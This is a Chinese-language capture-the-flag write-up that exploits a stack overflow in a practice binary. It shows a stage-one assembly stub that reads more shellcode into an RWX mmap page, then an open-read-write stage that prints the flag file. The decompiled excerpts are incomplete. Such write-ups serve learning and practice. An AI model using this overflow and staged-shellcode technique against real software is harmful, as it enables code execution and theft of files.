# 走后门

```c
ssize_t vuln()
{
  int v1; // [rsp+Ch] [rbp-44h] BYREF
  _BYTE buf[64]; // [rsp+10h] [rbp-40h] BYREF

  puts(aMaybeIfYouGive);
  puts("So how many do you want to give?");
  __isoc99_scanf("%d", &v1);
  puts("Now plz give it to me");

  {
    puts("Don't get cute with me and I am not the genie.");

```

很明显的栈溢出：读取的长度由我们自己决定，程序就原样往 `buf` 里写入这么多字节。

`buf` 长度为 64，再加上 8 字节的 saved rbp，构成第一部分的填充（共 72 字节）。

再看 main 函数的逻辑，这是一道经典的 ORW（open-read-write）题。

> 注意 `mmap(0, 0x1000u, 7, 34, -1, 0)` 的第三个参数 prot = 7，也就是 RWX = Read（可读）+ Write（可写）+ eXecute（可执行），指一块内存页同时具备这三种权限。

```c

  _QWORD v9[2]; // [rsp+20h] [rbp-78h] BYREF
  _QWORD v10[13]; // [rsp+30h] [rbp-68h] BYREF
```

OK那我们来复习一下把大象关进冰箱要几步

1. 打开 flag 文件。
2. 读取文件内容。
3. 输出文件内容。
4. 退出程序。

也就是 `openat`、`read`、`write`、`exit` 四个系统调用。

但很明显，stage1 有 40 字节的长度限制，还有坏字符限制，无法一次性把 payload 全部塞进去。

不过注意到 `mmap` 分配了 0x1000 字节且可读可写可执行的内存，而程序最后又通过 `v4(v4)` 跳转到这块内存去执行我们写入的内容。那就意味着：我们可以先用一次 `read` 把更长的 payload 读进这块内存（这次读取的长度由我们自己决定），再跳转过去执行。

鸡毛检查都没有，那我不就结束战斗了

```c
read(0, page + 0x40, 0x1000);
```

编译

```assembly
mov rsi, rdi ;rsi为页首地址
add rsi, 0x40 
xor edi, edi 
xor edx, edx
mov dh, 0x10
xor eax, eax
syscall
jmp rsi ;跳转到 rsi（即页首 + 0x40）处，执行刚刚读入的第二阶段 shellcode。
```

第二阶段：

打开、读取、输出、退出。

```c
int fd = openat(-100, "flag", 0, 0);   // 打开文件
char buf[0x100];
int n  = read(fd, buf, sizeof buf);    // 读内容
write(1, buf, n);                       // 打到标准输出
_exit(0);
```

那么 `read` 需要的东西：

```c
ssize_t read(int fd, void *buf, size_t count);
```

再复习一下：`rax` 用来接收 `openat` 的返回值（也就是文件描述符 fd），缓冲区直接丢在可写的栈上（`rsp`），最后写到标准输出并退出。

```

┌────┬──────────────────┐
│ 0  │ → 终端输入        │
│ 1  │ → 终端输出        │
│ 2  │ → 终端错误        │
│ 3  │ → flag 文件  ★   │  ← openat 返回 3，就是这张表的“行号”
└────┴──────────────────┘

```
